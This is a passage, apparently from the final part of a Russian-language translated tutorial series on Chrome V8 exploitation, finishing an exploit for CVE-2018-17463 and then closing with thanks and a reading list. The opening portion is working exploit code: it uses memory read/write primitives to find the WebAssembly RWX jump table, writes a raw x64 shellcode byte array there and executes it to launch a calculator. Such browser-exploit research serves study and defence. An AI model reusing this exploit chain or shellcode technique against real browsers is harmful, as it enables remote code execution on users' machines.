memory.addrOf(wasmInstance);\nprint(`[+] WebAssembly Instance Address @ 0x${wasmInstanceAddr.toString(16)}`);\nlet wasmRWXAddr = memory.read64(wasmInstanceAddr + 0xF0n);\nprint(`[+] WebAssembly RWX Jump Table Address @ 0x${wasmRWXAddr.toString(16)}`);\n\nprint(\"[+] Preparing Shellcode...\");\n// Подготавливаем шеллкод калькулятора\nlet shellcode = new Uint8Array([0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b,0x0c,0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,0x8b,0x04,0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,0xb8,0x0f,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xf7,0xd0,0x48,0xc1,0xe8,0x08,0x50,0x51,0xe8,0xb0,0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc9,0x48,0xf7,0xe1,0x50,0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe1,0x48,0xff,0xc2,0x48,0x83,0xec,0x20,0x41,0xff,0xd6]);\n\nprint(\"[+] Writing Shellcode to Jump Table Address...\");\n// Записываем шеллкод в адрес начала таблицы переходов\nmemory.write(wasmRWXAddr, shellcode);\n\n// Исполняем шеллкод\nprint(\"[+] Popping Calc...\");\nfunc();\n\r\nНастало время запустить эксплойт! Если всё пройдёт так, как запланировано, после вызова функции WebAssembly она должна исполнить наш шеллкод и запустить калькулятор!\n\r\n\n\r\nИтак, момент истины. Давайте проверим нашего вредоноса в действии!\n\r\n\n\r\n\n\r\nВот и всё! Наш скрипт эксплойта работает, и мы можем успешно исполнять шеллкод!\n\r\n\n\r\n\nВ заключение\n\r\nМы добились своего! Потратив три месяца на изучение внутреннего устройства Chrome и V8, мы смогли успешно проанализировать и использовать CVE-2018-17463! Это серьёзное достижение, ведь эксплойтинг Chrome — сложная задача.\n\r\n\n\r\nВ процессе чтения серии статей мы создали прочный фундамент знаний, подготовивший нас к работе с более сложными задачами эксплойтинга Chrome. В конце концов, мы смогли успешно проанализировать и использовать реальную уязвимость Chrome, продемонстрировав практическое применение изученных концепций.\n\r\n\n\r\nВ целом, эта серия статей была написана, чтобы глубоко и подробно познакомить читателей с миром эксплойтинга Chrome, и надеюсь, для вас она была информативной и полезной. Пусть вне зависимости от того, опытный ли вы исследователь безопасности или новичок, из серии статей вы извлекли важные сведения и знания.\n\r\n\n\r\nИскренне хочу поблагодарить за то, что были со мной до конца и за ваш интерес к этой теме!\n\r\n\n\r\nИнтересующиеся могут посмотреть готовый код эксплойта для этого проекта, который был добавлен в репозиторий \nCVE-2018-17463\n в моём Github.\n\r\n\n\r\n\nБлагодарности\n\r\nХочу от всей души поблагодарить \nV3ded\n за вычитку этого поста на предмет точности и читаемости! Спасибо!\n\r\n\n\r\n\nСсылки\n\r\n\n\r\n\nIssue 888923: Security: Chrome RCE\n\r\n\nPhrack: Exploiting Logic Bugs in JavaScript JIT Engines\n\r\n\nPhrack: Attacking JavaScript Engines\n\r\n\nSSD Advisory – Chrome Type Confusion in JSCreateObject Operation to RCE\n\r\n\nSamuel Gross: Attacking Client-Side JIT Compilers\n\r\n\nGoogle Chrome 67, 68 and 69 — Object.create Type Confusion (Metasploit)\n\r\n\nGitHub: kdmarti2 / CVE-2018-17463\n\r\n\nGitHub: Browser-Pwn Resources\n\r\n\nGitHub: Awesome Browser Exploit\n\r\n\nLiveOverflow — Getting Into Browser Exploitation\n\r\n\nProject Zero: JITSploitation II: Getting Read/Write\n\r\n\nBrowser Exploitation: A Case Study Of CVE-2020-6507\n\r\n\nZon8: JavaScript Engine Fuzzing and Exploitation Reading List\n\r\n\nRevisiting JavaScriptCore Internals: boxed vs. unboxed\n\r\n\nV8 Exploitation Series — Part 6\n\r\n\nExploiting the Math.expm1 typing bug in V8\n\r\n\n \n ",
    "tags": [
        "перевод"
    ]
}